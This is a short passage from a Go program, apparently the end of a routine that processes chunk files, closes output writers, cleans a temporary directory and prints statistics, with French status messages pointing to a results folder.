		if i < len(chunkFiles)-1 {
			time.Sleep(100 * time.Millisecond)
		}
	}
	fmt.Printf("\n%s[*] Écriture disque...%s\n", Cyan, Reset)
	closeAllWriters()
	if err := cleanupTempDir(); err != nil {
		fmt.Printf("[-] %s%s%s\n", Yellow, err, Reset)
	}
	printStats()
	fmt.Printf("%s[+] Résultats dans results/%s\n", Green, Reset)
}
